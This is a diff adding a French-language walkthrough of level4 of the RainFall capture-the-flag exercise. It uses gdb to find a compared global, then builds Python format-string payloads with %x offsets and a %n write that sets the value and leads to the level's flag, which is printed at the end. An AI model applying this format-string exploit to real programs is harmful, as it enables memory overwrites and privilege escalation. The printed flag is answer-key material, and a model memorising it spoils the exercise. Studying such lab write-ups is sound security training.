@@ -1,0 +1,56 @@
+ls -la
+./level4
+level4@RainFall:~$ ./level4
+qwe
+qwe
+pareil que le 2 et le 3
+
+gbd
+info function
+0x08048444  p
+0x08048457  n
+0x080484a7  main
+
+le main lance le n
+le n lance le p avec 
+on voit qu'il y a un cmp apres l'appel function de p donc on va surment pouvoir / devoir exploiter p pour l'appel system
+
+et hop on voit sur le p qu'il y a un printf on va donc essayer d'exploiter ca
+
+on a donc la valeur a changer avent le cmp il faut la trouver maintenant
+0x0804848d <+54>:    mov    0x8049810,%eax
+
+on lance donc le meme programe que pour le level3
+python -c "print 'AAAA' + '%x '*10" | ./level4
+la on le trouve pas donc on augmente le *10
+
+python -c "print 'AAAA' + '%x '*15" | ./level4
+
+et quand on a trouver on entoure de aaaa et de bbbb notre valeur a changer
+python -c "print 'AAAA' + '\x10\x98\x04\x08' + 'BBBB' + '%x '*15" | ./level4
+AAAABBBBb7ff26b0 bffff714 b7fd0ff4 0 0 bffff6d8 804848d bffff4d0 200 b7fd1ac0 b7ff37d0 41414141 8049810 42424242 25207825 
+
+du coup on a tout ca mais maintenant notre valeur qu'on va changer doit etre egale a:
+   0x08048492 <+59>:    cmp    $0x1025544,%eax
+$0x1025544
+je vais chercher comment faire 
+
+deja on affine notre print
+(python -c "print ('AAAA' + '\x10\x98\x04\x08' + '%x '*13)")| ./level4
+AAAAb7ff26b0 bffff714 b7fd0ff4 0 0 bffff6d8 804848d bffff4d0 200 b7fd1ac0 b7ff37d0 41414141 8049810
+
+bon la vue qu'il y a trop de chose a calculer j'ai regarder si je pouvais pas faire plus simplement pour avancer de arg en arg
+
+et apres un peu de tatonage j'ai trouver ca
+level4@RainFall:~$ python -c "print ('AAAA' + '\x10\x98\x04\x08' + '%13\$x')" | ./level4
+AAAA8049810
+si on enleve les AAAA on a bien 8049810
+donc y a plus ca override 0x1025544 qui est == 16930116 (hex to dec)
+
+on doit donc ajoute 16930116 - 8 caractere 
+avec 'A' *16930108
+ca ne marche pas donc on peut utiliser la technique de %16930108(c d ... tout marche c'est juste une option de printf)
+
+python -c "print ('AAAA' + '\x10\x98\x04\x08' + '%16930108c'+ '%13\$n')" | ./level4
+et hop
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
